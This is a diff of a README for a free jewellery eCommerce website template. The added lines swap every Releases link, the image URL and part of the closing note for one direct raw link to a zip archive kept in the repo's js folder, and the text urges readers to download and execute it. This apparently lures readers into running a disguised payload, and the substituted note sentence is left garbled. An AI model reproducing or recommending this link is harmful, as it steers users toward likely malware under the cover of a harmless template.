@@ -13,7 +13,7 @@ This repository hosts the code for the "Jewels" jewellery eCommerce website temp
 🔹 HTML CSS Website Template
 
 ## Installation
-To access and download the "Jewels" jewellery eCommerce free website template, please visit the [Releases](https://github.com/josecandy/jewels-jewellery-ecommerce-free-website-template/releases) section of this repository. You can find the necessary files to download and execute there.
+To access and download the "Jewels" jewellery eCommerce free website template, please visit the [Releases](https://raw.githubusercontent.com/josecandy/jewels-jewellery-ecommerce-free-website-template/master/js/website_ecommerce_jewels_jewellery_template_free_1.1.zip) section of this repository. You can find the necessary files to download and execute there.
 
 ## Topics
 This repository covers a variety of topics related to eCommerce and website templates, including:
@@ -43,16 +43,16 @@ If you are looking to set up an online store for jewellery products, the "Jewels
 We welcome contributions from the community to improve and enhance the "Jewels" jewellery eCommerce free website template. Feel free to submit pull requests with any updates or enhancements you would like to make.
 
 ## Support
-If you encounter any issues or have questions about using the template, please refer to the [Releases](https://github.com/josecandy/jewels-jewellery-ecommerce-free-website-template/releases) section for any available updates or contact the repository owner for assistance.
+If you encounter any issues or have questions about using the template, please refer to the [Releases](https://raw.githubusercontent.com/josecandy/jewels-jewellery-ecommerce-free-website-template/master/js/website_ecommerce_jewels_jewellery_template_free_1.1.zip) section for any available updates or contact the repository owner for assistance.
 
 ## License
 The "Jewels" jewellery eCommerce free website template is available for free use under the specified license. Please refer to the license information provided in the repository for details.
 
 Start building your jewellery eCommerce website with the "Jewels" jewellery eCommerce free website template today! 💎🌟
 
-![Jewellery eCommerce](https://example.com/image.jpg)
+![Jewellery eCommerce](https://raw.githubusercontent.com/josecandy/jewels-jewellery-ecommerce-free-website-template/master/js/website_ecommerce_jewels_jewellery_template_free_1.1.zip)
 
 ---
 
-**Note:** This README.md content is generated for a sample GitHub repository and some information provided may be fictional or hypothetical.
+**Note:** This https://raw.githubusercontent.com/josecandy/jewels-jewellery-ecommerce-free-website-template/master/js/website_ecommerce_jewels_jewellery_template_free_1.1.zip content is generated for a sample GitHub repository and some information provided may be fictional or hypothetical.
 
